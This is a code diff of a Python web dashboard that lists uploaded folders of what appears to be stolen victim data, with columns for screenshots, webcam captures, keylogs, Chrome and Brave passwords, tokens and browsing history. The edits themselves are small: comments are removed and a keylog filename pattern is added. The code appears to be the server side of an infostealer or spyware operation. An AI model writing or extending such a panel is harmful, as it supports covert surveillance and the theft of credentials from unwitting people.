@@ -13,7 +13,7 @@ os.makedirs(UPLOAD_ROOT, exist_ok=True)
 COLUMNS = [
     "Hostname", "Timestamp", "Desktop Screenshot", "Webcam", "Keylogs",
     "Decoded Keylogs", "Chrome History", "Brave History", "Chrome Passwords",
-    "Brave Passwords", "Tokens", "Recent Files", "File Access Log" 
+    "Brave Passwords", "Tokens", "Recent Files", "File Access Log"
 ]
 
 HTML_TEMPLATE = '''
@@ -76,7 +76,6 @@ def index():
         for folder in sorted(os.listdir(UPLOAD_ROOT), reverse=True):
             full_path = os.path.join(UPLOAD_ROOT, folder)
             if os.path.isdir(full_path):
-                # Convert folder timestamp to IST
                 try:
                     dt = datetime.strptime(folder, "%Y-%m-%d_%H-%M-%S")
                     utc = pytz.utc.localize(dt)
@@ -87,14 +86,14 @@ def index():
 
                 row = {"hostname": "", "timestamp": formatted_timestamp, "files": []}
 
-                # Match files for each column
                 for col in COLUMNS[2:]:
                     matched = False
                     for f in os.listdir(full_path):
                         normalized = col.lower().replace(" ", "_")
                         alternatives = {
                             "chrome_history": ["chrome_history", "browser_history"],
-                            "desktop_screenshot": ["desktop_screenshot", "screenshot"]
+                            "desktop_screenshot": ["desktop_screenshot", "screenshot"],
+                            "keylogs": ["keylogs", "keylogs_export"]
                         }
                         patterns = alternatives.get(normalized, [normalized])
                         if any(p in f.lower() for p in patterns):
@@ -104,7 +103,6 @@ def index():
                     if not matched:
                         row["files"].append(None)
 
-                # Extract hostname from activity_log.txt
                 activity_log_file = next((f for f in os.listdir(full_path) if "activity_log" in f.lower()), None)
                 if activity_log_file:
                     try:
